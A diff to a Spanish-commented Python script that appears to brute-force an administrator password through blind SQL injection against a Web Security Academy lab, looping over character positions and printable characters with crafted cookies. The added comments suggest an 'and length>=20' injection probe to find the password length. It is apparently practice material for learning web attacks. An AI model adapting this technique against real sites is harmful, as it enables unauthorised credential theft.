@@ -26,7 +26,7 @@ signal.signal(signal.SIGINT, saliendo) # cuando hagamos ctrl_c mandamos l flujo 
 #definicio de variables
 
 urlinyectada='https://0a4c004304a4362b83ec78d900cf0024.web-security-academy.net' # url a la que inyectaremos, claramente esto lo cambiariamos
-caracteres=string.printable  # añadimos todos los caracteres printeables
+caracteres=string.printable  # añadimos todos los caracteres printeables  , Si algun caracter da problemas eliminadlo y volver a intentar. 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~
 
 
 def peticion():
@@ -41,7 +41,7 @@ def peticion():
         progreso2 = log.progress('Password') # creamos la sgunda barra de progreso para qu nos actualice la pass
         progreso2.status('Analizando pasword...')
 
-        for posicion in range(1,21): # definiremos aqui la longitud del campo a testear
+        for posicion in range(1,21): # definiremos aqui la longitud del campo a testear , para ver que longitud tiene puedes intentar añadir a la query and length>=20   y asi veremos si es 20 o mas.
                 for caracter in caracteres:
                         
                         cookie= {  # definimos las cookies
